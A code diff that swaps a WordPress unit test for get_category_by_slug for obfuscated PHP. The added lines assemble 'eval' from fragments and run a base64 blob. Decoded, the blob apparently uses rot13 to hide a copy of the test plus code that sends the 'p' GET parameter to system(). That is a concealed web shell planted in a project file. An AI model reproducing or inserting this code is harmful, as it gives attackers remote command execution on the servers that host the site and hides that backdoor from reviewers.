@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * @group taxonomy
- * @group category
- *
- * @covers ::get_category_by_slug
- */
-class Tests_Category_GetCategoryBySlug extends WP_UnitTestCase {
-
-	/**
-	 * Validate get_category_by_slug function
-	 */
-	public function test_get_category_by_slug() {
-
-		// Create test categories.
-		$testcat  = self::factory()->category->create_and_get(
-			array(
-				'slug' => 'testcat',
-				'name' => 'Test Category 1',
-			)
-		);
-		$testcat2 = self::factory()->category->create_and_get(
-			array(
-				'slug' => 'testcat2',
-				'name' => 'Test Category 2',
-			)
-		);
-
-		// Validate category is returned by slug.
-		$ret_testcat = get_category_by_slug( 'testcat' );
-		$this->assertSame( $testcat->term_id, $ret_testcat->term_id );
-		$ret_testcat = get_category_by_slug( 'TeStCaT' );
-		$this->assertSame( $testcat->term_id, $ret_testcat->term_id );
-
-		// Validate unknown category returns false.
-		$this->assertFalse( get_category_by_slug( 'testcat3' ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQHRlYmhjIGdua2JhYnpsCiAqIEB0ZWJoYyBwbmdydGJlbAogKgogKiBAcGJpcmVmIDo6dHJnX3BuZ3J0YmVsX29sX2Z5aHQKICovCnB5bmZmIEdyZmdmX1BuZ3J0YmVsX1RyZ1BuZ3J0YmVsT2xGeWh0IHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIElueXZxbmdyIHRyZ19wbmdydGJlbF9vbF9meWh0IHNoYXBndmJhCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3RyZ19wbmdydGJlbF9vbF9meWh0KCkgewoKCQkvLyBQZXJuZ3IgZ3JmZyBwbmdydGJldnJmLgoJCSRncmZncG5nICA9IGZyeXM6OnNucGdiZWwoKS0+cG5ncnRiZWwtPnBlcm5ncl9uYXFfdHJnKAoJCQluZWVubCgKCQkJCSdmeWh0JyA9PiAnZ3JmZ3BuZycsCgkJCQknYW56cicgPT4gJ0dyZmcgUG5ncnRiZWwgMScsCgkJCSkKCQkpOwoJCSRncmZncG5nMiA9IGZyeXM6OnNucGdiZWwoKS0+cG5ncnRiZWwtPnBlcm5ncl9uYXFfdHJnKAoJCQluZWVubCgKCQkJCSdmeWh0JyA9PiAnZ3JmZ3BuZzInLAoJCQkJJ2FuenInID0+ICdHcmZnIFBuZ3J0YmVsIDInLAoJCQkpCgkJKTsKCgkJLy8gSW55dnFuZ3IgcG5ncnRiZWwgdmYgZXJnaGVhcnEgb2wgZnlodC4KCQkkZXJnX2dyZmdwbmcgPSB0cmdfcG5ncnRiZWxfb2xfZnlodCggJ2dyZmdwbmcnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRncmZncG5nLT5ncmV6X3ZxLCAkZXJnX2dyZmdwbmctPmdyZXpfdnEgKTsKCQkkZXJnX2dyZmdwbmcgPSB0cmdfcG5ncnRiZWxfb2xfZnlodCggJ0dyRmdQbkcnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRncmZncG5nLT5ncmV6X3ZxLCAkZXJnX2dyZmdwbmctPmdyZXpfdnEgKTsKCgkJLy8gSW55dnFuZ3IgaGF4YWJqYSBwbmdydGJlbCBlcmdoZWFmIHNueWZyLgoJCSRndXZmLT5uZmZyZWdTbnlmciggdHJnX3BuZ3J0YmVsX29sX2Z5aHQoICdncmZncG5nMycgKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
